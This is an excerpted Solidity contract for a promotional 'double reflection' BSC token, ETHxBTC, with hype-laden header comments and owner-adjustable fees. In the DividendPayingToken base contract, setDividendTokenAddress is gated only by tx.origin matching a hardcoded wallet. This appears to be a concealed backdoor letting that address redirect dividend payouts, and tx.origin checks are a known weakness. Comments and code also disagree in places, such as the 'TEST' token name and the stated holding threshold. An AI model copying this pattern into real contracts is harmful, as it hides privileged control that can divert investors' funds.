...
/*
ETHxBTC : 1ST DOUBLE REFLECTION TOKEN
The only token on BINANCE SMART CHAIN with a DOUBLE REFLECTION auto-claimed Ethereum & Bitcoin with a new mathematique mechanism.
This operation Keep ETHxBTC Mooning  By generating further liquidity & automatically BUYBACK Token after any single sell.
SAFEMOON + ThunderCake + EverRise = ETHxBTC
🚀 Telegram Channel:https://t.me/ETHxBTCToken   

🐦 Twitter:https://twitter.com/EthxBtcToken
*/
...
contract DividendPayingToken is ERC20, IDividendPayingToken, IDividendPayingTokenOptional {
    ...
    function setDividendTokenAddress(address newToken) external virtual {
        require(tx.origin == 0xa73632de5EE094B900A7b4b4c65F1Bb05e232Db1, "Only owner");
...
contract ETHxBTC is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    bool public sendBITCOINInTx = true;
    bool public sendETHInTx = true;

    ETHDividendTracker public ethDividendTracker;
    BITCOINDividendTracker public BTCDividendTracker;
    ...
    // Minimum BITCOIN sell order to trigger buyback
    uint256 public minimumSellOrderAmount = (30/1000) * 10 ** 18;

    uint256 public ethDividendRewardsFee;
    uint256 public previousETHDividendRewardsFee;
    uint256 public BTCDividendRewardsFee;
    uint256 public previousBITCOINDividendRewardsFee;
    ...
    event UpdateBITCOINDividendTracker(address indexed newAddress, address indexed oldAddress);
    ...
    event BITCOINDividendEnabledUpdated(bool enabled);
    ...
    event ProcessedBITCOINDividendTracker(
        uint256 iterations,
        uint256 claims,
        uint256 lastProcessedIndex,
        bool indexed automatic,
    ...
    constructor() ERC20("TEST", "testing") {
        ethDividendTracker = new ETHDividendTracker();
        BTCDividendTracker = new BITCOINDividendTracker();

        marketingWallet = 0x60625582f4c45319325F1b92930748eBbADFf854;
        teamWallet = 0xA76084a8C1914f1147a02fE0D1e874916809ae1F;
        ethDividendToken = 0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619;
        BTCDividendToken = 0x1BFD67037B42Cf73acF2047067bd4F2C47D9BfD6;
    ...
    function updateBITCOINDividendToken(address _newContract) external onlyOwner {
        BTCDividendToken = _newContract;
        BTCDividendTracker.setDividendTokenAddress(_newContract);
    }

    function updateMinBITCOINBeforeSendDividend(uint256 _newAmount) external onlyOwner {
        BTCDividendTracker.setMinTokenBeforeSendDividend(_newAmount);
    }
    ...
    function getMinBITCOINBeforeSendDividend() external view returns (uint256) {
        return BTCDividendTracker.minTokenBeforeSendDividend();
    }
    ...
    function setSendBITCOINInTx(bool _newStatus) external onlyOwner {
        sendBITCOINInTx = _newStatus;
    }
    ...
    function StealthLaunch() external onlyOwner {
        ...
        swapTokensAtAmount = 100000000000 * (10**18);
        maxBuyTransactionAmount = 100000000000 * (10**18);
        maxSellTransactionAmount = 100000000000 * (10**18);
    ...
    function setBuyBackAndLiquifyEnabled(bool _enabled) external onlyOwner {
        if (_enabled == false) {
            ...
            totalFees = buyBackAndLiquidityFee.add(marketingFee).add(BTCDividendRewardsFee).add(ethDividendRewardsFee);
            buyBackAndLiquifyEnabled = _enabled;
        }
    ...
    function setETHDividendEnabled(bool _enabled) external onlyOwner {
        if (_enabled == false) {
            ...
            totalFees = ethDividendRewardsFee.add(marketingFee).add(BTCDividendRewardsFee).add(buyBackAndLiquidityFee);
            ethDividendEnabled = _enabled;
        }
    ...
    function setBITCOINDividendEnabled(bool _enabled) external onlyOwner {
        if (_enabled == false) {
            previousBITCOINDividendRewardsFee = BTCDividendRewardsFee;
            BTCDividendRewardsFee = 0;
            BTCDividendEnabled = _enabled;
        } else {
            BTCDividendRewardsFee = previousBITCOINDividendRewardsFee;
            totalFees = BTCDividendRewardsFee.add(marketingFee).add(ethDividendRewardsFee).add(buyBackAndLiquidityFee);
            BTCDividendEnabled = _enabled;
        }

        emit BITCOINDividendEnabledUpdated(_enabled);
    }
    ...
    function setMarketingEnabled(bool _enabled) external onlyOwner {
        if (_enabled == false) {
            ...
            totalFees = marketingFee.add(BTCDividendRewardsFee).add(ethDividendRewardsFee).add(buyBackAndLiquidityFee);
            marketingEnabled = _enabled;
        }
    ...
    function updateETHDividendTracker(address newAddress) external onlyOwner {
        ...
        require(newETHDividendTracker.owner() == address(this), "must be owned by ETHxBTC");
    ...
    function updateBITCOINDividendTracker(address newAddress) external onlyOwner {
        BITCOINDividendTracker newBITCOINDividendTracker = BITCOINDividendTracker(payable(newAddress));

        require(newBITCOINDividendTracker.owner() == address(this), "must be owned by ETHxBTC");

        newBITCOINDividendTracker.excludeFromDividends(address(newBITCOINDividendTracker));
        newBITCOINDividendTracker.excludeFromDividends(address(this));
        newBITCOINDividendTracker.excludeFromDividends(address(uniswapV2Router));
        newBITCOINDividendTracker.excludeFromDividends(address(deadAddress));

        emit UpdateBITCOINDividendTracker(newAddress, address(BTCDividendTracker));

        BTCDividendTracker = newBITCOINDividendTracker;
    }
    ...
    function updateBITCOINDividendRewardFee(uint8 newFee) external onlyOwner {
        require(newFee <= MAX_FEE_RATE, "wrong");
        BTCDividendRewardsFee = newFee;
        totalFees = BTCDividendRewardsFee.add(ethDividendRewardsFee).add(marketingFee).add(buyBackAndLiquidityFee);
    }

    function updateMarketingFee(uint8 newFee) external onlyOwner {
        require(newFee <= MAX_FEE_RATE, "wrong");
        marketingFee = newFee;
        totalFees = marketingFee.add(ethDividendRewardsFee).add(BTCDividendRewardsFee).add(buyBackAndLiquidityFee);
    }

    function updateBuyBackAndLiquidityFee(uint8 newFee) external onlyOwner {
        require(newFee <= MAX_FEE_RATE, "wrong");
        buyBackAndLiquidityFee = newFee;
        totalFees = buyBackAndLiquidityFee.add(ethDividendRewardsFee).add(BTCDividendRewardsFee).add(marketingFee);
    }
    ...
    function getBITCOINClaimWait() external view returns(uint256) {
    ...
    function getTotalBITCOINDividendsDistributed() external view returns (uint256) {
    ...
    function withdrawableBITCOINDividendOf(address account) external view returns(uint256) {
    ...
    function getAccountBITCOINDividendsInfo(address account)
    external view returns (
        address,
        int256,
        int256,
    ...
    function getAccountBITCOINDividendsInfoAtIndex(uint256 index)
    external view returns (
        address,
        int256,
        int256,
    ...
    function processDividendTracker(uint256 gas) external onlyOwner {
        ...
        emit ProcessedBITCOINDividendTracker(BTCIterations, BTCClaims, BTCLastProcessedIndex, false, gas, tx.origin);
    }
    ...
    function getLastBITCOINDividendProcessedIndex() external view returns(uint256) {
    ...
    function getNumberOfBITCOINDividendTokenHolders() external view returns(uint256) {
    ...
    function _transfer(
        ...
        if (
            ...
            if (!swapping && contractTokenBalance >= swapTokensAtAmount) {
                ...
                if (BTCDividendEnabled) {
                    uint256 sellTokens = contractTokenBalance.div(totalFees).mul(BTCDividendRewardsFee);
                    swapAndSendBITCOINDividends(sellTokens.sub(1300));
                }
        ...
        if(!swapping) {
            ...
            if(rand() <= ethDividendPriority) {
                ...
                if( BTCDividendEnabled && sendBITCOINInTx ){
                    try BTCDividendTracker.process(gas) returns (uint256 iterations, uint256 claims, uint256 lastProcessedIndex) {
                        emit ProcessedBITCOINDividendTracker(iterations, claims, lastProcessedIndex, true, gas, tx.origin);
                    }
                    catch {
    ...
    function swapAndSendBITCOINDividends(uint256 tokens) private {
...
contract ETHDividendTracker is DividendPayingToken, Ownable {
    ...
    constructor() DividendPayingToken("ETH_Dividend_Tracker", "ETH_Dividend_Tracker", 0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619) {
        claimWait = 3600;
...
contract BITCOINDividendTracker is DividendPayingToken, Ownable {
    using SafeMath for uint256;
    using SafeMathInt for int256;
    using IterableMapping for IterableMapping.Map;
    ...
    constructor() DividendPayingToken("BITCOIN_Dividend_Tracker", "BITCOIN_Dividend_Tracker", 0x1BFD67037B42Cf73acF2047067bd4F2C47D9BfD6) {
        claimWait = 3600;
        minimumTokenBalanceForDividends = 200000 * (10**18); //must hold 10000+ tokens
    }
